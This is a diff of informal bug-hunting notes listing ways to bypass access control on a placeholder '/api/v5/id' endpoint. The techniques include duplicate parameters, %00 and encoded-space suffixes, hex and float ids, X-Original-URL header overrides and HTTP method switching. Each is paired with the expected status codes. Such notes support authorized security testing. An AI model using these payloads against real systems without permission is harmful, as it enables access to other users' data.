@@ -28,6 +28,7 @@ subpath or endpoint variant
 /api/v5/id/6/details or something -- 200
 fuzz with paraminer or hidden endpoints 
 
+
 multi id or filter param abuse
 /api/v5/id/5     --- 200 ok
 /api/v5/id/6     ---- 403 
@@ -36,6 +37,7 @@ multi id or filter param abuse
 /api/v5/id/6.5    --200
 /api/v5/id/6'     --200
 also try /api/v5/id?user=5,6 with all above  200 
+/api/v5/id?user=5&user=6
 
 type confusion
 /api/v5/id/5     --- 200 ok
@@ -46,7 +48,6 @@ type confusion
 may be try all symbols fuzz
 
 
-
 leading zeros / hex / other format
 /api/v5/id/5     --- 200 ok
 /api/v5/id/6     ---- 403 
@@ -54,4 +55,28 @@ leading zeros / hex / other format
 /api/v5/id/0x6   -- 200 hex format encdo
 
 
+null or termination or control char-encoding
+/api/v5/id/5     --- 200 ok
+/api/v5/id/6     ---- 403 
+/api/v5/id/6%00  -- 200 
+/api/v5/id/6%00/ try with above techn 
 
+headers or proxy based
+/api/v5/id/5     --- 200 ok
+/api/v5/id/6     ---- 403 
+/api/v5/id/5   X-original-url: /api/v5/id/6    --- 200 ok
+also try with x-forwarded and all
+
+encoded space tricks 
+/api/v5/id/5     --- 200 ok
+/api/v5/id/6     ---- 403 
+/api/v5/id/%206   --200
+/api/v5/id/6%20   --200
+
+
+float
+/api/v5/id/5     --- 200 ok
+/api/v5/id/6     ---- 403 
+/api/v5/id/6.099   -- 200 
+
+HTTP instead: GET, POST, PUT, DELETE, PATCH,
